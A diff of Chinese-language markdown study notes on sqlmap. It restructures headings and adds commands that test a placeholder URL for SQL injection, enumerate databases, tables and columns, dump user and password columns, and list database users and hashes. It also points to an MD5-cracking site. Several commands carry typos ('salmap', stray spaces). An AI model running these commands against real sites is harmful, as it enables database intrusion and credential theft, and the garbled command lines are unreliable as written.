@@ -1,5 +1,4 @@
-## sqlmap
-### sqlmap入门
+## 注入点判断
 1. 判断是否存在注入点
 ```
 sqlmap -u http://xxx
@@ -14,7 +13,7 @@ sqlmap -u "http://xxx/?id=1&uid=2"
 salmap -r txt文本
 ```
 
-存在注入点后，进行下一步操作
+## 存在注入点后，进行下一步操作
 1. 查询当前用户下的所有数据库
 ```
 sqlmap -u http://xxx/ --dbs
@@ -42,7 +41,9 @@ sqlmap -u http://xxx/ -D dkeye -T user_info -- columns
 sqlmap.py -u http://xxx/ - D dkeye -T use＿info -C user,name,password --dump
 ```
 
-获取与数据库用户相关的信息
+
+
+## 获取与数据库用户相关的信息
 1. 获取到数据库中的所有用户
 ```
 salmap -u "http://xxx/" --users
@@ -52,4 +53,17 @@ salmap -u "http://xxx/" --users
 ```
 salmap -u "http://xxx/" --password
 ``` 
-获取到的密码是
+获取到的密码是经过md5加密的，可以在[md5解密网站](https://www.cmd5.com/)
+3. 获取当前网脑数据库的名称
+```
+salmap -u "http://xxx/" --current-db
+``` 
+4. 获取当前网览数据库的用户名称
+```
+salmap -u "http://xxx/" --current-user
+``` 
+
+
+```{.python .input}
+
+```
